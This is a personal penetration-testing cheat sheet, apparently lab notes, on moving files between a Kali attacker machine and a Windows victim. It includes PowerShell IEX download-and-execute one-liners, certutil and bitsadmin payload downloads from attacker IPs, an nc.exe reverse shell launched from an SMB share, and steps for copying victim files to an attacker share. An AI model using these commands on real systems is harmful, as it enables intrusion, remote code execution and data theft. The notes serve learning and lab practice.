# From Attacker to windows
**PowerShell**
To download a file from the URL `http://10.10.10.3/vv.vbs` and save it to `C:\temp\` using CMD in Windows, you can use one of the following methods:

### Method 1: PowerShell (Built into Windows)
PowerShell is often pre-installed and supports downloading files directly:
```cmd
powershell -command "Invoke-WebRequest -Uri 'http://10.10.14.27/rottenpotato.exe' -OutFile 'C:\temp\rottenpotato.exe'"
```
To download a file using PowerShell, you can use `Invoke-WebRequest` to fetch the file, but based on your query, you're referring to using `IEX` (short for `Invoke-Expression`) with `New-Object`. This pattern is often used in PowerShell scripts to download and execute a file.

Here is an example of how you might **download a file and execute** it using `IEX` and `New-Object`:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://example.com/maliciousscript.ps1')
```

### Explanation:
- `New-Object Net.WebClient`: Creates a new instance of the `WebClient` class, which is used to download content from the web.
- `.DownloadString('http://example.com/maliciousscript.ps1')`: Downloads the content of the script at the specified URL.
- `IEX`: Executes the downloaded script as PowerShell code.

This approach is commonly used in penetration testing or malicious attacks but also has legitimate uses in automating PowerShell scripts.

If you're just downloading a file and saving it locally (rather than executing it), you could use:

```powershell
(New-Object Net.WebClient).DownloadFile('http://example.com/file.zip', 'C:\path\to\save\file.zip')
```

#### Another method
The `Invoke-WebRequest` (iwr) command in PowerShell can be used to transfer files by downloading them from a specified URI (Uniform Resource Identifier) and saving them to a local path. Here's a breakdown of your command:

```powershell
iwr -Uri http://Kali-IP/file.exe -OutFile C:\temp\file.exe
```

### Explanation:

1. **`iwr`**: Short for `Invoke-WebRequest`, this cmdlet sends HTTP/HTTPS requests to the specified server.
2. **`-Uri`**: Specifies the web address of the file to download. In this case, `http://Kali-IP/file.exe` is the URL.
3. **`-OutFile`**: Specifies the local file path where the downloaded content will be saved. Here, the file is saved as `C:\Users\Temp\file.exe`.


### Method 2: Using `curl` (Available in Windows 10 and newer)
If `curl` is available on your system, you can use this command:
```cmd
curl -o C:\temp\vv.vbs http://10.10.10.3/vv.vbs
```
### Method 3: Using wget (if available)
If `wget` is installed, you can use it directly:
``` cmd
wget http://example.com/file.exe -O C:\path\to\save\file.exe
```


---
**CMD**
--- ---- ---- ------ -----

### Method 4: Using `bitsadmin` (Available in Windows by default)
`bitsadmin` can download files but may be deprecated on newer Windows versions:
```cmd
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.3/vv.vbs C:\temp\vv.vbs
```

### Method 5: Using `certutil` (Typically available on Windows)
`certutil` can also be used to download files over HTTP:
```cmd
certutil -urlcache -split -f http://<Kali-IP>/file C:\Temp\file
```

Each of these methods will download the specified file and place it in `C:\temp\`. Note that **admin privileges** may be required for certain commands, especially when accessing protected directories.

### Method 6: Using `smbserver` (In case i cannot do download so i can execute from SMB shared file directly)
#### On the Attacker Machine (Kali Linux):
1. **Create a Directory to Act as the Share**:
   ```bash
   mkdir /tmp/share
   ```
Put nc.exe in folder
1. **Start the SMB Server with Impacket**:
   Run the `smbserver.py` script to create an SMB server on Kali Linux:
   ```bash
   python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support public /tmp/share
   ```
#### On the Victim Machine (Windows):
Example downloading nc.exe and execute it:
   ```cmd
   cmd.exe /c //192.168.45.211/public/nc.exe -e cmd.exe 192.168.45.211 443
   ```

---
# Transferring Files from Windows to Kali 

### Configure Samba for Anonymous Access 🎯
To set up SMB (Windows File Sharing) on Kali Linux with **anonymous access (no password)**, follow these steps:
 **Step 1: Install Samba on Kali Linux**
Ensure Samba is installed on your Kali Linux machine:

```bash
sudo apt update
sudo apt install samba -y
```
 **Step 2: Configure Samba for Anonymous Access**

1. **Edit the Samba Configuration File**: Open the Samba configuration file in your favorite editor:
    
    ```bash
    sudo nano /etc/samba/smb.conf
    ```
    
2. **Add a Public Share Section**: Add the following configuration at the end of the file:
    
 ```ini
    [public]
    path = /tmp/share
    browseable = yes
    writable = yes
    guest ok = yes
    force user = nobody
```
    
    Explanation:
    - `path`: Directory to share.
    - `browseable`: Makes the share visible in the network.
    - `writable`: Allows write access.
    - `guest ok`: Enables anonymous access without requiring authentication.
    - `force user`: Maps all anonymous users to the `nobody` user.
3. **Create the Shared Directory**:
    
    ```bash
    sudo mkdir -p /tmp/share
    sudo chmod 777 /tmp/share
    ```
    
4. **Restart Samba Service**: Apply the changes:
    
    ```bash
    sudo service smbd restart
    sudo service nmbd restart
    ```
 **Step 3: Access the Share from Windows**

First to check that its work
``` powershell
net use x: \\<Kali_IP>\public
```
Create folder by `mkdir test` and monitor it in shared folder in kali-linux 
To delete this action
``` powershell
net use x: /delete
```

5. Open `Run` (`Win + R`).
6. Enter the following:
    ```text
    \\<Kali_IP>\public
    ```
    
7. You should see the `public` shared folder without being prompted for a username or password.
 **Step 4: Troubleshoot if Necessary**
- **Firewall**: Ensure the firewall on Kali Linux allows SMB traffic (port 445):
    ```bash
    sudo ufw allow 445
    sudo ufw allow 137/udp
    sudo ufw allow 138/udp
    sudo ufw allow 139/tcp
    ```
- **Check SMB Status**: Verify that the SMB service is running:
    ```bash
    sudo systemctl status smbd
    ```
- **Windows Credentials**: If Windows prompts for a username and password, clear any cached credentials:
    1. Open the **Credential Manager**.
        
    2. Remove any saved credentials for the Kali Linux IP address.
For Creating a [[Create NTFS Disk on kali linux]]


#### On the Attacker Machine (Kali Linux):
1. **Create a Directory to Act as the Share**:
   ```bash
   mkdir /tmp/share
   ```
   This folder (`/tmp/share`) will be shared over the SMB server and will store files copied from the Windows machine.

2. **Start the SMB Server with Impacket**:
   Run the `smbserver.py` script to create an SMB server on Kali Linux:
   ```bash
   python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username user -password pass public /tmp/share
   ```
   - Replace `<user>` and `<pass>` with a username and password of your choice for accessing the share.
   - `public` is the name of the SMB share, which can be accessed by the Windows host.
   - `/tmp/share` is the path to the directory that will be accessible from the Windows machine.

3. **Confirm the SMB Server is Running**:
   Once started, your SMB server should be listening for connections, allowing file transfers between the Windows host and Kali Linux.

#### On the Victim Machine (Windows):
1. **Access the SMB Share**:
   Open `cmd` and use the following command to connect to the SMB share on Kali:
   ```cmd
   net use \\ATTACKER_IP\public /user:user pass
   ```
   - Replace `ATTACKER_IP` with the IP address of your Kali Linux machine.
   - Replace `<user>` and `<pass>` with the username and password set when starting the SMB server.

2. **Copy the File to the SMB Share**:
   Use the `copy` command to transfer a file to the SMB share:
   ```cmd
   copy C:\Users\THMBackup\<File_name> \\ATTACKER_IP\public\
   ```
   - Replace `<File_name>` with the file you want to transfer.
   - The file will be copied to `/tmp/share` on your Kali machine.
Using `New-PSDrive` in PowerShell is an alternative method to mount the SMB share on Windows, which can be convenient for file transfers. Here’s how to do it to transfer files from Windows to Kali Linux with an Impacket SMB server.

3. **Disconnect the SMB Share** (Optional): After transferring the file, you can disconnect from the SMB share:
    
    ```cmd
    net use \\10.11.96.245\public /delete
    ```
    
---

### Steps to Transfer Files Using `New-PSDrive` in PowerShell

#### 1. On the Attacker Machine (Kali Linux)

1. **Create a Shared Directory**:
   ```bash
   mkdir /tmp/share
   ```
   This directory will store the files transferred from the Windows machine.

2. **Start the SMB Server with Impacket**:
   Run the Impacket `smbserver.py` script to create an SMB share on Kali:
   ```bash
   python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username <user> -password <pass> public /tmp/share
   ```
   - Replace `<user>` and `<pass>` with a username and password for accessing the share.
   - `public` is the name of the SMB share.
   - `/tmp/share` is the folder path that will be accessible to the Windows machine.

3. **Ensure the SMB Server is Running**:
   Once started, your SMB server should be ready to accept file transfers from the Windows machine.

#### 2. On the Victim Machine (Windows)

1. **Open PowerShell as Administrator**:
   Start PowerShell with administrator privileges to ensure you have the necessary permissions.

2. **Create a New Drive Mapping to the SMB Share**:
   Use the `New-PSDrive` cmdlet to map the SMB share to a drive letter on Windows:
   ```powershell
   New-PSDrive -Name K -PSProvider FileSystem -Root "\\ATTACKER_IP\public" -Credential (New-Object System.Management.Automation.PSCredential("<user>", (ConvertTo-SecureString "<pass>" -AsPlainText -Force)))
   ```
   - Replace `K` with any available drive letter.
   - Replace `ATTACKER_IP` with the IP address of your Kali Linux machine.
   - Replace `<user>` and `<pass>` with the username and password you specified when starting the SMB server.

   This command creates a new drive (e.g., `K:`) that points to the SMB share on your Kali machine.

3. **Verify the Drive Mapping**:
   You can check that the drive is mapped by listing the contents of the new drive:
   ```powershell
   Get-ChildItem K:\
   ```
   This should display the contents of the `/tmp/share` folder on Kali Linux.

4. **Copy Files to the New Drive**:
   Use the `Copy-Item` cmdlet to transfer files from Windows to the SMB share:
   ```powershell
   Copy-Item -Path "C:\Users\THMBackup\<File_name>" -Destination "K:\"
   ```
   - Replace `<File_name>` with the file you want to copy.

5. **Confirm File Transfer**:
   - On your Kali machine, check the `/tmp/share` directory to see if the file has been transferred successfully.

6. **Unmount the Drive (Optional)**:
   Once you’re done, you can remove the drive mapping with:
   ```powershell
   Remove-PSDrive -Name K
   ```

# Downloading the PDF by converting it to base64 and then copy and pasting it to our box

1. Convert the file to Base64
``` powershell
$b64 = [Convert]::ToBase64String([IO.FILE]::ReadAllBytes("File.pdf"))
$b64
```
2. Copy the out to your `kali-linux` OS in a file as base64
```
base64 -d fixed.b64 > file.pdf
```
#### But doesn't work for me
